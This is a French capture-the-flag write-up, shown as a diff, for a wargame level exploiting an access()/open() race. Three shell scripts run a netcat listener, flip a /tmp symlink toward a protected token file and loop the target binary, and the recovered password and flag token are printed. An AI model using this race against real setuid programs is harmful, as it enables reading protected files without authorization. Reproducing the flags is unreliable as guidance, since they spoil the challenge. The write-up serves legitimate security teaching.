@@ -1,0 +1,63 @@
+EN fesant un : strings level10  on obtient :
+[...]
+open
+access
+[...]
+Connecting to %s:6969 ..
+[...]
+
+La fonction access possede une faille permettant d'utiliser le laps de temps entre le check des droits sur le fichier et son ouverture. Nous allons donc tenter de l'exploiter.
+Pour ce faire nous allons realiser 3 scripts dans le fichier /tmp.
+Le premier servira simplement a ecouter le port 6969
+
+check.sh
+
+#!/bin/sh
+
+while true
+do
+        nc -l 6969
+done
+
+L'option -l permet d'ecouter la connection qui va arriver.
+
+Le second servira a creer un lien symbolique dans /tmp, endroit dans lequel nous avons des droits.
+
+create.sh
+
+#!/bin/sh
+
+while true
+do
+        touch /tmp/tokken
+        ln -sf ~/token /tmp/tokken
+        rm -rf /tmp/tokken 
+done 
+
+Le dernier nous permet d'executer le programme et de reussir a profiter du laps de temps entre access et open
+
+start.sh
+
+#!/bin/sh
+
+while true
+do
+        ~/level10 /tmp/tokken 0
+done
+
+Une fois ces trois scripts crees, il suffit d'avoir 3 fenetres connecter en ssh et de lancer les scripts.
+En premier nous lancons : sh /tmp/create.sh
+Pendant que celui-ci tourne, nous lancons dans une autre des 3 fenetres : sh /tmp/check.sh
+Et enfin pendant que les deux scripts tournent, nous lancons dans notre 3eme fenetre le script : sh /tmp/start.sh
+
+
+Une fois ces 3 scripts lances on observe dans la fenetre de check.sh ceci : 
+[...]
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+[...]
+
+Ce code etant la clef pour ce connecter a flag10 : 
+su flag10
+getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
